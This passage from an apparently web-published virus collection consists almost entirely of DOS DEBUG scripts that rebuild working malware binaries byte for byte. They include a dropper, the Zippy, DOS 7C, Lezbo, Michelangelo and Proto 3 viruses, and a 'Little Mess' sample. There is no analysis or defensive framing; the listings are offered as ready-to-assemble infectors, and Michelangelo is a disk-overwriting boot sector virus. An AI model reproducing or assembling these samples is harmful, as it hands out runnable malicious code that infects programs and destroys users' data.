e 290 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 2A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 2B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 2C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 2D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 2E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 2F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 55 AA
rcx
200
w
q
</pre>
<!--p.245-->
<h4><a name="pm12"></a>Dropper Program</h4>
<pre class="source">
n pcscav.com
e 100 E9 12 03 58 D6 B0 58 70 BE A6 7F 90 4F D9 07 A8
e 110 4F C2 07 DC 4F C1 C9 EE 71 C5 9B 04 3F 7D 52 04
e 120 7A 0A 93 B2 BE 91 98 43 C9 21 71 58 0E B0 C9 61
e 130 71 58 04 B0 9B C9 73 C3 7B 0A 30 B3 9B DC 73 5B
e 140 A9 0A 73 B4 9B 05 73 C3 7B 0A D5 B3 9B EC 73 5B
e 150 B9 0E A0 B5 CC 63 74 4C CA 90 73 43 D6 0A 78 B4
e 160 9B 33 73 0A 66 B4 9B 35 73 C3 7B 0A F7 B3 9B 8A
e 170 73 5B DB 58 26 B0 00 17 C9 D3 70 58 5E B0 98 2B
e 180 C9 0B 71 58 56 B0 C9 BB 77 58 03 B0 00 B6 C9 63
e 190 70 58 64 B0 9B 84 73 C3 7A 0A 10 B3 9B BC 73 59
e 1A0 0A 4F C9 B9 70 58 70 B0 9A C0 8C 04 7A 7D 52 73
e 1B0 CD B4 73 08 72 B2 58 79 C9 30 73 F1 C8 A5 77 7D
e 1C0 60 C3 74 9B B3 7D 60 FE 06 59 B0 0E 77 B0 CB B1
e 1D0 70 9B BA 0A F3 B0 32 0B 66 B6 BE A3 00 B7 58 70
e 1E0 BE A3 3D C5 9A 73 C7 8C 58 79 BE 91 E0 73 C7 F0
e 1F0 CA B0 71 7D 52 C2 77 04 4D 7D 52 73 CB B0 4E 9B
e 200 BA 7D 52 C2 78 23 C7 8F CA B0 71 0A 66 B6 BE 91
e 210 B0 E0 30 90 20 F3 32 E6 36 FE 34 F5 21 90 32 DE
e 220 07 D9 5E E6 1A C2 06 C3 53 FD 12 C3 07 D5 01 90
e 230 31 DF 1C C4 53 E2 16 D3 1C C2 17 BD 79 F9 3D E3
e 240 27 F1 3F FC 53 98 10 99 42 89 4A 83 53 FB 12 C2
e 250 00 C4 16 DE 53 FA 1C D8 12 DE 00 C3 1C DE 7E BA
e 260 79 F4 1C 90 0A DF 06 90 04 D1 1D C4 53 C4 1C 90
e 270 5B F9 5A DE 00 C4 12 DC 1F 9C 53 98 21 99 16 C3
e 280 07 DF 01 D5 5F 90 1C C2 53 98 22 99 06 D9 07 8F
e 290 57 BD 79 F9 1D C3 07 D1 1F DC 53 E0 30 90 20 F3
e 2A0 32 E6 36 FE 34 F5 21 90 3E D1 00 C4 16 C2 53 F2
e 2B0 1C DF 07 90 21 D5 10 DF 01 D4 57 BD 79 E2 16 C3
e 2C0 07 DF 01 D5 53 DF 01 D9 14 D9 1D D1 1F 90 3E F2
e 2D0 21 BD 79 E2 16 D1 17 D9 1D D7 5D 9E 5D BD 79 94
e 2E0 37 DF 1D D5 5D 90 53 E4 1B D1 1D DB 53 C9 1C C5
e 2F0 53 D6 1C C2 53 C5 00 D9 1D D7 53 E0 30 90 20 D3
e 300 12 C6 16 DE 14 D5 01 9E 57 E9 1C C5 53 D3 12 DE
e 310 53 F9 1D C3 07 D1 1F DC 53 E0 30 90 20 D3 12 C6
e 320 16 DE 14 D5 01 90 11 C9 53 C2 06 DE 1D D9 1D D7
e 330 53 E0 30 E3 30 F1 25 9E 30 FF 3E 90 12 D7 12 D9
e 340 1D 9E 57 F3 1C C5 1F D4 53 DE 1C C4 53 C2 16 D1
e 350 17 90 3E F2 21 9E 53 F1 11 DF 01 C4 1A DE 14 9E
e 360 5D 9E 57 F3 1C C5 1F D4 53 DE 1C C4 53 C7 01 D9
e 370 07 D5 53 FD 31 E2 5D 90 32 D2 1C C2 07 D9 1D D7
e 380 5D 9E 5D 94 30 DF 06 DC 17 90 1D DF 07 90 04 C2
e 390 1A C4 16 90 15 D9 1F D5 5D 90 32 D2 1C C2 07 D9
e 3A0 1D D7 5D 9E 5D 94 23 F3 20 F3 32 E6 5D F2 3A FE
e 3B0 53 DD 06 C3 07 90 11 D5 53 D9 1D 90 07 D8 16 90
e 3C0 17 D5 15 D1 06 DC 07 90 17 D9 01 D5 10 C4 1C C2
e 3D0 0A 9E 57 E0 32 E2 27 FE 5D F2 3A FE 53 90 1E C5
e 3E0 00 C4 53 D2 16 90 1A DE 53 C4 1B D5 53 D4 16 D6
e 3F0 12 C5 1F C4 53 D4 1A C2 16 D3 07 DF 01 C9 5D 94
e 400 23 F3 20 F3 32 E6 5D F2 3A FE 73 E0 32 E2 27 FE
<!--p.246-->
e 410 5D F2 3A FE 73 BE 00 01 56 B9 8B 01 C7 04 C9 A1
e 420 C6 44 02 71 81 34 73 B0 46 46 E2 F8 31 F6 31 C9
e 430 C3 00
rcx
332
w
q
</pre>
<!--p.247-->
<h3><a name="pm2"></a>Zippy Virus</h3>
<pre class="source">
n zippy.com
e 100 2A C9 B4 4E BA 1C 01 CD 21 B8 01 3D BA 9E 00 CD
e 110 21 93 B4 40 8B D6 B9 20 00 CD 21 C3 2A 2E 2A 00
rcx
20
w
q
</pre>
<!--p.248-->
<h3><a name="pm3"></a>DOS 7C</h3>
<pre class="source">
n dos-7c.com
e 100 C7 06 07 01 52 01 B8 68 01 A3 2E 01 2B C0 1E 8E
e 110 D8 8E C0 BE 84 00 BF 0C 00 A5 A5 26 A1 00 00 A3
e 120 70 01 26 A1 02 00 A3 77 01 26 C7 06 00 00 4C 4D
e 130 1F 8C D8 80 C4 10 26 A3 02 00 8E C0 BF 00 01 8B
e 140 F7 B9 A3 01 F3 A4 8E D8 F7 F1 B4 3E CC B4 4F CC
e 150 EB 3A 2B C9 41 0E 07 B8 05 FE EB FC 2D 02 E7 B7
e 160 01 BA 00 00 CD 13 EB EC 06 51 07 26 C7 06 00 00
e 170 4C 4D 26 C7 06 02 00 41 53 07 C7 06 07 01 68 01
e 180 B4 1A 99 CC B4 4E 2B C9 BA 23 02 CC 72 7E B8 02
e 190 3D BA 1E 00 CC 72 B6 8B D8 B4 3F BF 1A 00 8B 0D
e 1A0 8B D6 CC 8B 04 72 A6 3B 06 00 01 74 9D 8B 44 02
e 1B0 3D 15 60 74 02 EB 3F 57 56 BE 4D 02 BF F0 23 B9
e 1C0 55 00 90 FC F3 A4 BE 2A 02 BF 57 90 B9 0C 00 90
e 1D0 F3 A4 BE 36 02 BF 4C 91 B9 17 00 90 F3 A4 B8 00
e 1E0 42 2B D2 8B CA CC B4 40 BA A3 02 B9 BD CE CC B4
e 1F0 3E CC 5E 5F EB 16 B8 00 42 2B D2 8B CA CC FE C6
e 200 B4 40 8B 0D 81 C1 A3 01 CC B4 3E CC 8C D0 8E C0
e 210 8E D8 50 B4 1A D1 EA CC BF 00 01 57 8B CC 2B CE
e 220 F3 A4 CB 2A 57 2E 43 3F 4D 00 69 73 20 69 6E 66
e 230 65 63 74 65 64 21 6F 79 2C 20 61 72 65 20 79 6F
e 240 75 20 65 76 65 72 20 64 75 6D 62 21 20 4D 53 44
e 250 4F 53 20 37 20 28 43 29 31 39 39 33 20 41 4E 41
e 260 52 4B 49 43 4B 20 53 59 53 54 45 4D 53 0D 0A 01
e 270 01 01 20 20 20 20 20 44 4F 53 20 36 20 41 6E 74
e 280 69 76 69 72 75 73 20 73 75 63 6B 73 2E 20 49 74
e 290 20 6D 69 73 73 65 64 20 74 68 69 73 20 6F 6E 65
e 2A0 21 20 24 B4 09 BA 09 01 CC B4 4C CC 5B 44 4F 53
e 2B0 20 37 76 01 01 01 5D 20 4C 75 63 69 66 65 72 20
e 2C0 4D 65 73 73 69 61 68 24
rcx
1C8
w
q
</pre>
<!--p.249-->
<h3><a name="pm4"></a>Lezbo Virus</h3>
<pre class="source">
n lezbo.exe
e 100 4D 5A 9A 00 03 00 00 00 20 00 02 00 FF FF 00 00
e 110 00 00 00 00 00 00 00 00 3E 00 00 00 01 00 FB 30
e 120 6A 72 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 130 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 140 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 150 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 160 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 170 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 180 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 190 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 1A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 1B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 1C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 1D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 1E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 1F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 200 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 210 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 220 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 230 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 240 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 250 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 260 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 270 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 280 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 290 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 2A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 2B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 2C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 2D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 2E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 2F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 300 BB 07 00 81 C3 8B 02 81 EB 92 02 48 CD 21 0A C4
e 310 74 47 1E 33 FF 8E DF 66 A1 84 00 66 2E 89 87 A1
e 320 00 8C C1 49 8E D9 81 6D 03 80 00 8B 45 12 2D 80
e 330 00 89 45 12 8E C0 2D 00 10 2E 89 87 AB 00 0E 1F
e 340 8B F3 B9 92 02 FC F3 A4 8E D9 FA C7 06 84 00 84
e 350 00 8C 06 86 00 FB 1F 1E 07 8D B7 92 02 BF 00 01
e 360 3B DF 72 04 57 66 A5 C3 8C C0 05 10 00 2E 01 44
e 370 02 2E 01 44 04 FA 2E 8B 64 06 2E 8E 54 04 FB 2E
e 380 FF 2C 40 CF 3D FF FF 74 F9 80 FC 4B 74 58 80 FC
e 390 11 74 12 80 FC 12 74 0D 3D 00 3D 75 03 E8 4B 00
e 3A0 EA 4B 53 4B 53 55 8B EC 81 7E 04 4B 53 5D 72 F0
e 3B0 E8 AF 01 50 53 52 06 B4 2F E8 A6 01 26 80 3F FF
e 3C0 74 03 83 EB 07 26 8A 47 1E 24 1F 3C 1F 75 12 66
e 3D0 26 8B 47 24 66 2D 9A 02 00 00 7C 05 66 26 89 47
e 3E0 24 07 5A 5B 58 CF E8 42 00 EB B5 56 57 1E 06 51
e 3F0 50 8B F2 AC 0A C0 74 2C 3C 2E 75 F7 BF 86 02 0E
<!--p.250-->
e 400 07 B9 03 00 51 56 B9 03 00 03 F9 57 AC 24 5F 26
e 410 3A 05 75 0B 47 E2 F5 E8 11 00 83 C4 06 EB 05 5F
e 420 5E 59 E2 E0 58 59 07 1F 5F 5E C3 9C 50 53 51 56
e 430 57 06 1E 52 B8 00 43 E8 28 01 72 1B 51 80 E1 01
e 440 80 F9 01 59 75 09 80 E1 FE B8 01 43 E8 13 01 B8
e 450 02 3D E8 0D 01 73 03 E9 FE 00 93 0E 0E 1F 07 B8
e 460 00 57 E8 FD 00 52 51 80 E1 1F 80 F9 1F 74 0D BA
e 470 9A 02 B9 1C 00 B4 3F E8 E8 00 73 04 F9 E9 C6 00
e 480 3B C1 75 F8 33 D2 8B CA B8 02 42 E8 D4 00 81 3E
e 490 9A 02 4D 5A 74 24 80 3E 9D 02 4F 74 DF BE 9A 02
e 4A0 BF 92 02 66 A5 2D 03 00 C6 06 9A 02 E9 A3 9B 02
e 4B0 C6 06 9D 02 4F 05 0A 01 EB 55 81 3E AA 02 9A 04
e 4C0 74 BA 83 3E B4 02 00 75 B3 52 50 B1 04 D3 CA D3
e 4D0 E8 03 C2 2B 06 A2 02 BE AE 02 BF 92 02 66 A5 BE
e 4E0 A8 02 66 A5 A3 B0 02 A3 A8 02 C7 06 AA 02 9A 04
e 4F0 58 5A 50 05 9A 04 73 01 42 B9 00 02 F7 F1 A3 9E
e 500 02 89 16 9C 02 58 25 0F 00 A3 AE 02 05 07 00 A3
e 510 01 00 1E 33 F6 8E DE 1F 53 BF B6 02 B9 9A 02 51
e 520 FC F3 A4 BA B6 02 59 5B B4 40 E8 35 00 72 17 33
e 530 D2 8B CA B8 00 42 E8 29 00 72 0B BA 9A 02 B9 1C
e 540 00 B4 40 E8 1C 00 59 5A 72 03 80 C9 1F B8 01 57
e 550 E8 0F 00 B4 3E E8 0A 00 5A 1F 07 5F 5E 59 5B 58
e 560 9D C3 9C 2E FF 1E A1 00 C3 20 2D 5B 4C 45 5A 42
e 570 4F 5D 2D 20 54 68 65 20 57 68 6F 72 65 20 6F 66
e 580 20 42 61 62 79 6C 6F 6E 20 43 4F 4D 45 58 45 4F
e 590 56 4C 00 00 F0 FF 00 00 FF FF
rcx
49A
w
q
</pre>
<!--p.251-->
<h3><a name="pm5"></a>Michelangelo Virus</h3>
<pre class="source">
n mich.boo
e 100 E9 AC 00 F5 00 00 00 02 03 00 00 00 00 00 1E 50
e 110 0A D2 75 1B 33 C0 8E D8 F6 06 3F 04 01 75 10 58
e 120 1F 9C 2E FF 1E 0A 00 9C E8 0B 00 9D CA 02 00 58
e 130 1F 2E FF 2E 0A 00 50 53 51 52 1E 06 56 57 0E 1F
e 140 0E 07 BE 04 00 B8 01 02 BB 00 02 B9 01 00 33 D2
e 150 9C FF 1E 0A 00 73 0C 33 C0 9C FF 1E 0A 00 4E 75
e 160 E4 EB 43 33 F6 FC AD 3B 07 75 06 AD 3B 47 02 74
e 170 35 B8 01 03 B6 01 B1 03 80 7F 15 FD 74 02 B1 0E
e 180 89 0E 08 00 9C FF 1E 0A 00 72 1B BE BE 03 BF BE
e 190 01 B9 21 00 FC F3 A5 B8 01 03 33 DB B9 01 00 33
e 1A0 D2 9C FF 1E 0A 00 5F 5E 07 1F 5A 59 5B 58 C3 33
e 1B0 C0 8E D8 FA 8E D0 B8 00 7C 8B E0 FB 1E 50 A1 4C
e 1C0 00 A3 0A 7C A1 4E 00 A3 0C 7C A1 13 04 48 48 A3
e 1D0 13 04 B1 06 D3 E0 8E C0 A3 05 7C B8 0E 00 A3 4C
e 1E0 00 8C 06 4E 00 B9 BE 01 BE 00 7C 33 FF FC F3 A4
e 1F0 2E FF 2E 03 7C 33 C0 8E C0 CD 13 0E 1F B8 01 02
e 200 BB 00 7C 8B 0E 08 00 83 F9 07 75 07 BA 80 00 CD
e 210 13 EB 2B 8B 0E 08 00 BA 00 01 CD 13 72 20 0E 07
e 220 B8 01 02 BB 00 02 B9 01 00 BA 80 00 CD 13 72 0E
e 230 33 F6 FC AD 3B 07 75 4F AD 3B 47 02 75 49 33 C9
e 240 B4 04 CD 1A 81 FA 06 03 74 01 CB 33 D2 B9 01 00
e 250 B8 09 03 8B 36 08 00 83 FE 03 74 10 B0 0E 83 FE
e 260 0E 74 09 B2 80 C6 06 07 00 04 B0 11 BB 00 50 8E
e 270 C3 CD 13 73 04 32 E4 CD 13 FE C6 3A 36 07 00 72
e 280 CF 32 F6 FE C5 EB C9 B9 07 00 89 0E 08 00 B8 01
e 290 03 BA 80 00 CD 13 72 A6 BE BE 03 BF BE 01 B9 21
e 2A0 00 F3 A5 B8 01 03 33 DB FE C1 CD 13 EB 90 00 00
e 2B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 2C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 2D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 2E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 2F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 55 AA
rcx
200
w
q
</pre>
<!--p.252-->
<h3><a name="pm6"></a>Proto 3 Virus</h3>
<pre class="source">
n proto3.com
e 100 E8 00 00 5E 83 EE 03 BF 00 01 FC 50 1E 06 57 56
e 110 33 C0 48 CC 0A C4 74 48 8C C0 48 8E D8 2B DB 80
e 120 3F 5A 75 3C 8B 47 03 2D 30 02 72 34 89 47 03 81
e 130 6F 12 30 02 8E 47 12 0E 1F B9 C5 06 F3 A4 06 1F
e 140 B8 21 35 CD 21 89 1E E4 00 8C 06 E6 00 BA CD 01
e 150 B8 03 25 CD 21 BA CD 01 B8 21 25 CC B8 6E 72 CC
e 160 5E 5F 07 1F 58 81 C6 C1 01 2B F7 57 66 A5 C3 B8
e 170 B0 B4 00 B8 B3 B7 00 B9 B1 B5 90 F8 4D FC 45 F9
e 180 FA F5 F3 F2 F3 F2 45 F9 FA F2 08 20 84 88 07 07
e 190 04 05 03 03 06 07 30 30 00 28 00 C8 F0 C0 79 06
e 1A0 80 06 50 07 6B 07 96 06 A0 06 B9 06 04 07 15 07
e 1B0 21 07 72 07 8E 06 30 07 47 07 55 07 62 07 B0 03
e 1C0 CF CD 20 00 00 40 9D CF E8 43 02 EB 27 9C 3D FF
e 1D0 FF 74 F2 06 1E 56 57 52 51 53 50 3D 6E 72 74 E8
e 1E0 3D 00 4B 74 0C 3D 00 6C 75 0A F6 C3 03 75 05 8B
e 1F0 D7 E8 0E 00 58 5B 59 5A 5F 5E 1F 07 9D 2E FF 2E
e 200 E4 00 FC 0E 07 8B F2 2B FF B9 80 00 AC 0A C0 74
e 210 12 90 90 3C 61 72 08 3C 7A 77 04 90 90 34 20 AA
e 220 E2 EA C3 AA 8D 75 FB 0E 1F AD 3D 2E 45 74 F3 FD
e 230 8B CE 41 AC 3C 3A 74 06 3C 5C 74 02 E2 F5 FC B8
e 240 00 33 CC 52 99 40 50 CC B8 24 35 CC 06 53 0E 1F
e 250 BA BE 01 B4 25 50 CC B8 00 43 99 CC 51 2B C9 B8
e 260 01 43 50 CC 72 68 B8 02 3D CC 72 62 93 B8 00 57
e 270 CC 52 51 B9 04 00 BE C1 01 8B D6 B4 3F CC 72 45
e 280 B8 02 42 2B C9 99 CC BF E0 00 89 05 89 55 02 8A
e 290 44 03 3C 4F 74 2F 81 3C 4D 5A 74 29 8B 05 8B D0
e 2A0 FE C6 E8 35 00 75 1E C6 04 E9 2C 03 89 44 01 2B
e 2B0 C0 99 87 D1 92 B8 00 42 CC C6 44 03 4F B9 04 00
e 2C0 8B D6 B4 40 CC 59 5A B8 01 57 CC B4 3E CC 58 59
e 2D0 99 CC 58 5A 1F CC 58 5A CC C3 50 52 56 55 06 FA
e 2E0 8C 55 FC 89 65 FE 8C C8 8E D0 BC 00 23 05 D0 00
e 2F0 8E C0 FB 1E 8B EA BA 00 01 B9 C5 06 2B F6 57 53
e 300 52 56 2B FF E8 19 01 25 7F 00 03 C8 51 E8 10 01
e 310 0A C0 74 F9 A3 EA 00 E8 06 01 93 E8 23 03 59 B8
e 320 11 01 F6 C3 20 75 02 34 07 F6 C3 0C 75 02 34 70
e 330 F6 C3 40 75 03 80 F4 07 F6 C3 10 75 02 24 73 F6
e 340 C7 80 75 02 24 70 8B D0 E8 D5 00 25 0F 00 3C 0A
e 350 77 F6 8B F0 51 91 B8 01 00 D3 E0 8B C8 23 CA 59
e 360 74 E6 33 D0 52 E8 EC 00 E8 FE 02 5A 0B D2 75 D8
e 370 57 E8 77 01 E8 F2 02 F6 C7 20 74 03 B0 F8 AA C7
e 380 06 EC 00 00 00 E8 97 01 E8 D7 01 E8 DB 02 5A E8
e 390 35 02 2B C0 F6 C7 01 74 0A 8B C1 48 F6 C3 10 74
e 3A0 02 24 FE 03 C7 03 C5 5E 03 C6 2B 06 EC 00 8B 36
e 3B0 EE 00 F6 C3 0C 75 0C 26 88 04 8B 36 F0 00 26 88
e 3C0 24 EB 03 26 89 04 8B 16 EA 00 5E 57 51 F6 C3 10
e 3D0 74 0C 41 D1 E9 AD E8 64 00 AB E2 F9 EB 09 AC 2A
e 3E0 F6 E8 59 00 AA E2 F7 8B CF 58 5F 2B D2 06 1F 5B
e 3F0 5F 51 52 B8 02 42 33 C9 99 CC 5A 59 B4 40 CC 1F
e 400 FA 8E 55 FC 8B 65 FE FB 07 5D 5E 5A 58 C3 52 51
<!--p.253-->
e 410 2A E4 CD 1A 89 16 24 04 A3 27 04 8A C2 59 5A C3
e 420 52 51 53 B8 34 12 BA 78 56 B9 07 00 D1 E0 D1 D2
e 430 8A D8 32 DE 79 02 FE C0 E2 F2 5B EB D7 03 16 E8
e 440 00 F6 C3 02 75 03 33 C2 C3 F6 C3 01 75 03 2B C2
e 450 C3 03 C2 C3 8B D6 8A 84 6F 01 80 FA 04 75 03 E8
e 460 97 01 F6 C2 0C 9C 75 07 F6 C3 80 74 02 04 02 E8
e 470 36 00 9D 75 05 A1 EA 00 EB 1E F6 C2 08 75 0F BE
e 480 EE 00 F6 C2 02 74 03 83 C6 02 89 3C EB 0A 8B C1
e 490 F6 C3 10 74 03 40 D1 E8 F6 C2 03 74 09 F6 C2 02
e 4A0 74 02 86 E0 AA C3 AB C3 53 51 50 E8 72 FF 93 58
e 4B0 F6 C3 03 74 32 50 83 E3 0F 24 08 D1 E0 0B D8 58
e 4C0 24 07 B1 09 91 F6 E1 05 C0 30 86 E0 F6 C3 04 74
e 4D0 02 B0 28 E8 58 01 AB B0 80 E8 52 01 AA B8 9A 01
e 4E0 93 25 03 00 D7 02 C1 AA 59 5B C3 51 BE E8 00 C7
e 4F0 04 00 00 8B C3 25 10 81 35 10 80 75 20 8B C3 2A
e 500 E4 B1 03 F6 F1 0A E4 75 14 F6 C3 80 75 05 B0 05
e 510 AA EB 04 B8 81 C2 AB E8 06 FF 89 04 AB 59 C3 F6
e 520 C7 80 74 27 E8 E5 00 E8 ED 00 E8 7B 00 2B C0 F6
e 530 C3 80 74 02 04 10 E8 C5 00 F6 C7 08 75 02 AA C3
e 540 0C 80 AA E8 DA FE AB A3 EC 00 C3 B0 80 E8 58 00
e 550 E8 B9 00 E8 C1 00 E8 DD FF A1 EA 00 F6 C3 10 E9
e 560 23 02 F6 C3 08 74 05 F6 C7 02 75 41 F6 C7 04 74
e 570 14 B0 40 F6 C7 01 74 02 04 08 E8 7C 00 AA F6 C3
e 580 10 74 01 AA C3 F6 C7 40 74 03 B0 F8 AA B0 83 AA
e 590 B0 C0 F6 C7 01 74 02 B0 E8 F6 C7 40 74 04 24 CF
e 5A0 0C 10 E8 54 00 AA B0 01 E8 7B 00 AA C3 F6 C7 01
e 5B0 74 03 B0 FD AA F6 C7 04 74 05 F6 C3 04 75 04 B0
e 5C0 A6 EB E5 B0 AE EB E1 F6 C7 01 75 07 E8 51 FE A8
e 5D0 01 75 11 B0 E0 F6 C7 1A 74 02 04 02 AA 8B C2 2B
e 5E0 C7 48 AA C3 F6 C7 10 75 09 B8 83 E9 AB B0 01 AA
e 5F0 EB 03 B0 49 AA B0 75 EB E3 BE 92 01 EB 03 BE 8E
e 600 01 53 C0 EB 02 83 E3 03 02 00 5B C3 53 B8 96 01
e 610 93 25 03 00 D7 5B C3 F6 C3 02 74 09 F6 C7 20 74
e 620 04 24 CF 0C 10 C3 F6 C3 10 74 02 FE C0 C3 E8 F5
e 630 FF 3C 81 74 0B 50 E8 E7 FD A8 01 58 74 02 04 02
e 640 C3 E8 DC FD 25 7F 00 3D 00 00 74 06 91 E8 03 00
e 650 E2 FB C3 E8 CA FD 25 1E 00 EB 06 E8 C2 FD 25 06
e 660 00 96 E8 BB FD FF A4 9E 01 E8 B4 FD A8 03 74 26
e 670 A8 02 74 2C A8 01 74 E3 C3 25 0F 00 0C 70 AB C3
e 680 B0 EB 80 E4 07 FE C4 AB 86 E0 98 E9 2D 01 E8 05
e 690 00 B8 E2 FD AB C3 53 24 0F BB 7A 01 D7 AA 5B C3
e 6A0 53 25 03 03 BB 8A 01 D7 02 C4 AA E8 72 FD 24 07
e 6B0 B3 09 F6 E3 04 C0 AA 5B C3 51 B0 E8 80 E4 0F FE
e 6C0 C4 AB 2A C0 AA 86 E0 E8 F1 00 E8 9C FF E8 50 FD
e 6D0 24 07 E8 B6 00 8B C8 0C 58 AA F6 C5 03 75 23 E8
e 6E0 87 FF B8 87 F0 0A E1 F6 C5 08 74 02 B0 8B AB E8
e 6F0 77 FF 53 E8 2A FD 93 81 E3 FB F7 80 CB 08 E8 1E
e 700 FE 5B 59 C3 24 0F 0C B0 E8 80 00 AA A8 08 9C E8
e 710 0E FD 9D EB 70 80 E4 39 0C C0 E8 6E 00 86 E0 AB
e 720 C3 24 3B 0C 02 80 E4 3F E8 6B 00 E8 84 00 AB C3
e 730 24 09 F6 C4 01 74 04 0C A6 AA C3 0C A0 AA 3C A8
e 740 9C E8 DC FC 9D EB 3E 24 07 0C 90 E8 3D 00 AA C3
e 750 E8 F4 FF AA C3 80 E4 07 80 CC 50 8A C4 80 CC 08
e 760 AB C3 24 0F 0C 40 E8 22 00 AA C3 E8 F4 FF 34 08
<!--p.254-->
e 770 AA C3 80 E4 01 0D C0 80 E8 10 00 86 E0 AB A8 01
e 780 9C E8 9C FC 9D 74 02 AB C3 AA C3 50 24 07 3C 04
e 790 58 75 02 24 FB C3 50 80 E4 38 80 FC 20 58 75 03
e 7A0 80 F4 20 C3 50 80 E4 07 80 FC 06 58 75 03 80 CC
e 7B0 01 C3 F6 C4 04 75 ED 80 E4 FD C3 51 91 E8 60 FC
e 7C0 AA E2 FA 59 C3
rcx
6C5
w
q
</pre>
<!--p.255-->
<h3><a name="pm7"></a>Little Mess</h3>
<pre class="source">
n ltlmess.slc
e 100 0B 1D 2B 1A 00 00 26 02 00 04 F5 00 00 1A 19 21
e 110 02 00 18 28 5B 4C 69 74 74 6C 65 20 4D 65 73 73
e 120 20 28 63 29 20 39 32 20 43 72 6F 6D 2D 43 72 75
e 130 61 63 68 2F 54 72 69 64 65 6E 74 5D 00 18 04 2E
e 140 53 4C 58 00 18 40 00 00 00 00 00 00 00 00 00 00
e 150 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 160 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 170 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 180 00 00 00 00 00 00 00 18 40 4C 54 4C 4D 45 53 53
e 190 2E 53 4C 43 00 00 18 0C 51 44 48 4F 53 54 2E 53
e 1A0 4C 58 00 00 00 18 11 0B 1D 2B 1A 00 00 26 02 00
e 1B0 04 F5 00 00 1A 19 21 02 00 1A 01 00 00 00 1D BE
e 1C0 00 1D CD 00 15 2E 16 15 1D 00 18 0C 4C 54 4C 4D
e 1D0 45 53 53 2E 53 4C 58 00 00 18 0C 51 44 48 4F 53
e 1E0 54 2E 53 4C 58 00 00 00 18 11 0B 1D 2B 1A 00 00
e 1F0 26 02 00 04 F5 00 00 1A 19 21 02 00 1A 01 00 00
e 200 00 1D BE 00 1D CD 00 15 2E 16 15 1D 38 00 15 2E
e 210 30 21 05 2A 2E 53 4C 43 00 1D 38 00 2C 64 31 2E
e 220 30 1D BE 00 25 00 1D 38 00 2C 23 31 01 2A 2E 01
e 230 25 00 1E 01 00 15 2E 28 E1 01 21 00 00 1D 38 00
e 240 15 2E 16 15 1D 7B 00 15 2E 30 1D BE 00 1D 7B 00
e 250 2C 64 31 2E 30 1D BE 00 25 07 1D 7B 00 2C 27 31
e 260 2E 30 1D 31 00 1D BE 00 2C 64 31 2E 30 1D BE 00
e 270 1D 7B 00 2C 9B 31 25 00 0F 2A 73 01 2B 14 01 30
e 280 21 01 77 00 1D 7B 00 2C 28 31 1E F0 00 15 2E 1E
e 290 F0 00 25 00 0E 2A AC 01 16 15 1D 38 00 15 2E 30
e 2A0 1D BE 00 1D 38 00 2C 64 31 2E 30 1D 7B 00 1D 38
e 2B0 00 2C 9B 31 2E 2B E1 01 30 1E F0 00 25 11 1D DC
e 2C0 00 2C 2E 31 2E 30 1E F0 00 24 21 02 1D 02 00 2C
e 2D0 2E 31 2E 30 1E F0 00 30 2C 12 31 25 FE 10 1D 02
e 2E0 00 2C 2E 31 2E 30 1E F0 00 2C 1C 31 2E 30 1D CD
e 2F0 00 2C 03 31 2E 1E 01 00 25 00 0E 30 2C 12 31 25
e 300 07 10 25 07 0E 13 2A 24 02 30 25 0A 21 1D 4C 65
e 310 67 61 6C 69 7A 65 20 4D 61 72 69 6A 75 61 6E 61
e 320 21 20 2D 20 C2 DA B3 10 E4 EF C2 00 2C 96 31 2E
e 330 26 42 00 18 28 5B 4C 69 74 74 6C 65 20 4D 65 73
e 340 73 20 28 63 29 20 39 32 20 43 72 6F 6D 2D 43 72
e 350 75 61 63 68 2F 54 72 69 64 65 6E 74 5D 00 18 04
